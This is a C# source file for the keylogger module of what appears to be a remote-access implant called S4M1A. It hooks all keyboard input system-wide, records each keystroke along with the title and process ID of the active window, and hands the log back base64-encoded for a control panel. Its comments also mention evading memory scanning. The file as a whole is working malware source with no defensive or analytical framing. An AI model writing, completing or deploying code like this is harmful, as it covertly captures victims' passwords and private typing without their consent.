using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace S4M1A.Implant.Modules
{
    // =====================================================================
    //  S4M1A Keylogger v2.0 - global keyboard capture via WH_KEYBOARD_LL
    //
    //  Contract (used by Commands.cs):
    //    Keylogger.Running (bool)
    //    Keylogger.Start()       -> "ok" | "already" | "fail"
    //    Keylogger.Flush()       -> base64(UTF-8 log) or null; clears buffer
    //    Keylogger.StopAndFlush()-> same as Flush, then stops hook + thread
    //
    //  Output format (panel saves it as .log):
    //    [2026-08-01 12:00:00] <window title> (<pid>)
    //    typed characters plus <TAB> <ENTER> <BKSP> <CTRL> style tokens
    //
    //  The hook callback is unmanaged (ntdll/user32 frame), so it keeps
    //  firing even while SleepMask masks the managed image - however do not
    //  combine with SleepMask while capture is running (see SleepMask.cs).
    // =====================================================================

    public static class Keylogger
    {
        public static bool Running { get { return _running; } }

        // ---------------- P/Invoke ----------------
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn,
            IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState,
            StringBuilder pwszBuff, int cchBuff, uint wFlags);

        [DllImport("user32.dll")]
        private static extern bool GetKeyboardState(byte[] lpKeyState);

        [DllImport("user32.dll")]
        private static extern int GetMessage(out MSG lpMsg, IntPtr hWnd, uint wMsgFilterMin, uint wMsgFilterMax);

        [DllImport("user32.dll")]
        private static extern bool TranslateMessage(ref MSG lpMsg);

        [DllImport("user32.dll")]
        private static extern IntPtr DispatchMessage(ref MSG lpMsg);

        [DllImport("kernel32.dll")]
        private static extern uint GetCurrentThreadId();

        [DllImport("user32.dll")]
        private static extern bool PostThreadMessage(uint idThread, uint Msg, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        [DllImport("user32.dll")]
        private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

        [StructLayout(LayoutKind.Sequential)]
        private struct MSG
        {
            public IntPtr hwnd;
            public uint message;
            public IntPtr wParam;
            public IntPtr lParam;
            public uint time;
            public int ptX;
            public int ptY;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct KbdLLHookStruct
        {
            public uint vkCode;
            public uint scanCode;
            public uint flags;
            public uint time;
            public ulong dwExtraInfo;
        }

        // ---------------- constants ----------------
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_SYSKEYDOWN = 0x0104;
        private const int WM_QUIT = 0x0012;

        private const int VK_SHIFT = 0x10;
        private const int VK_CAPITAL = 0x14;
        private const int VK_LSHIFT = 0xA0;
        private const int VK_RSHIFT = 0xA1;
        private const int VK_LCONTROL = 0xA2;
        private const int VK_RCONTROL = 0xA3;
        private const int VK_LMENU = 0xA4;
        private const int VK_RMENU = 0xA5;
        private const int VK_LWIN = 0x5B;
        private const int VK_RWIN = 0x5C;

        private const int MaxBufferChars = 4 * 1024 * 1024;   // 4 MB cap
        private const int HeaderRefreshMinutes = 10;          // re-stamp headers

        // ---------------- state ----------------
        private static LowLevelKeyboardProc _proc;
        private static IntPtr _hookId;
        private static Thread _thread;
        private static uint _threadId;
        private static volatile bool _running;
        private static readonly object _lock = new object();
        private static StringBuilder _buffer = new StringBuilder();
        private static bool _caps;
        private static string _lastTitle = "";
        private static uint _lastPid;
        private static DateTime _lastHeader = DateTime.MinValue;

        // =====================================================================
        //  Public API
        // =====================================================================

        public static string Start()
        {
            if (_running) return "already";
            lock (_lock)
            {
                _buffer.Clear();
                _lastTitle = "";
                _lastPid = 0;
            }
            _running = true;
            _proc = HookCallback;
            _thread = new Thread(PumpLoop);
            _thread.IsBackground = true;
            _thread.Name = "s4m1a-keylog";
            _thread.Start();

            for (int i = 0; i < 100 && _running; i++)
            {
                if (_hookId != IntPtr.Zero) break;
                Thread.Sleep(10);
            }
            if (_hookId == IntPtr.Zero) { _running = false; return "fail"; }
            return "ok";
        }

        public static string Flush()
        {
            lock (_lock)
            {
                if (_buffer.Length == 0) return null;
                string text = _buffer.ToString();
                _buffer.Clear();
                return Convert.ToBase64String(Encoding.UTF8.GetBytes(text));
            }
        }

        public static string StopAndFlush()
        {
            string data = Flush();
            _running = false;
            if (_threadId != 0)
                PostThreadMessage(_threadId, WM_QUIT, IntPtr.Zero, IntPtr.Zero);
            if (_thread != null && _thread.IsAlive)
                _thread.Join(1500);
            _threadId = 0;
            return data;
        }

        // =====================================================================
        //  Hook plumbing
        // =====================================================================

        private static void PumpLoop()
        {
            _threadId = GetCurrentThreadId();
            try
            {
                using (Process cur = Process.GetCurrentProcess())
                {
                    _hookId = SetWindowsHookEx(WH_KEYBOARD_LL, _proc,
                        cur.MainModule.BaseAddress, 0);
                }
            }
            catch { _hookId = IntPtr.Zero; }

            if (_hookId == IntPtr.Zero) { _running = false; return; }

            MSG msg;
            int ret;
            while (_running && (ret = GetMessage(out msg, IntPtr.Zero, 0, 0)) != 0)
            {
                if (ret == -1) break;
                TranslateMessage(ref msg);
                DispatchMessage(ref msg);
            }

            if (_hookId != IntPtr.Zero)
            {
                UnhookWindowsHookEx(_hookId);
                _hookId = IntPtr.Zero;
            }
            _running = false;
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)
            {
                int wp = wParam.ToInt32();
                if (wp == WM_KEYDOWN || wp == WM_SYSKEYDOWN)
                {
                    try
                    {
                        KbdLLHookStruct kbd = (KbdLLHookStruct)Marshal.PtrToStructure(lParam, typeof(KbdLLHookStruct));
                        ProcessKey(kbd.vkCode, kbd.scanCode, kbd.flags);
                    }
                    catch { }
                }
            }
            return CallNextHookEx(_hookId, nCode, wParam, lParam);
        }

        // =====================================================================
        //  Keystroke translation
        // =====================================================================

        private static void ProcessKey(uint vk, uint scan, uint flags)
        {
            if (vk == 0) return;
            if (vk == VK_CAPITAL) { _caps = !_caps; return; }
            if (vk == VK_LSHIFT || vk == VK_RSHIFT || vk == VK_SHIFT) return; // handled via state

            // ---- try real character translation (respects layout + shift) ----
            char c = '\0';
            bool printable = false;
            byte[] state = new byte[256];
            GetKeyboardState(state);
            state[VK_CAPITAL] = (byte)(_caps ? 0x01 : 0x00);

            StringBuilder sb = new StringBuilder(8);
            int r = ToUnicode(vk, scan, state, sb, sb.Capacity, 0);
            if (r == 1 && sb.Length == 1)
            {
                char ch = sb[0];
                if (ch >= 0x20 && ch != 0x7F)
                {
                    printable = true;
                    c = ch;
                }
            }

            string token = printable ? null : SpecialName(vk);
            Append(c, token, printable);
        }

        private static string SpecialName(uint vk)
        {
            switch (vk)
            {
                case 0x08: return "<BKSP>";
                case 0x09: return "<TAB>";
                case 0x0D: return "<ENTER>\r\n";
                case 0x1B: return "<ESC>";
                case 0x20: return " ";
                case 0x21: return "<PGUP>";
                case 0x22: return "<PGDN>";
                case 0x23: return "<END>";
                case 0x24: return "<HOME>";
                case 0x25: return "<LEFT>";
                case 0x26: return "<UP>";
                case 0x27: return "<RIGHT>";
                case 0x28: return "<DOWN>";
                case 0x2C: return "<PRTSC>";
                case 0x2D: return "<INS>";
                case 0x2E: return "<DEL>";
                case 0x2F: return "<MENU>";
                case VK_LWIN: case VK_RWIN: return "<WIN>";
                case VK_LCONTROL: case VK_RCONTROL: case 0x11: return "<CTRL>";
                case VK_LMENU:  case VK_RMENU:  case 0x12: return "<ALT>";
                default:
                    if (vk >= 0x70 && vk <= 0x87) return "<F" + (vk - 0x6F) + ">";
                    return null; // ignored keys (modifiers, mouse, etc.)
            }
        }

        private static void Append(char c, string token, bool printable)
        {
            lock (_lock)
            {
                CheckWindowHeader();
                if (_buffer.Length >= MaxBufferChars)
                    _buffer.Remove(0, _buffer.Length - MaxBufferChars);
                if (printable) _buffer.Append(c);
                else if (token != null) _buffer.Append(token);
            }
        }

        // =====================================================================
        //  Context headers
        // =====================================================================

        private static void CheckWindowHeader()
        {
            try
            {
                IntPtr h = GetForegroundWindow();
                StringBuilder sb = new StringBuilder(256);
                GetWindowText(h, sb, sb.Capacity);
                string title = sb.ToString();
                if (string.IsNullOrEmpty(title)) title = "(no title)";

                uint pid;
                GetWindowThreadProcessId(h, out pid);

                bool changed = title != _lastTitle || pid != _lastPid ||
                               (DateTime.UtcNow - _lastHeader).TotalMinutes >= HeaderRefreshMinutes;
                if (changed)
                {
                    _buffer.Append("\r\n[").Append(DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"))
                           .Append("] ").Append(title).Append(" (").Append(pid).Append(")\r\n");
                    _lastTitle = title;
                    _lastPid = pid;
                    _lastHeader = DateTime.UtcNow;
                }
            }
            catch { }
        }
    }
}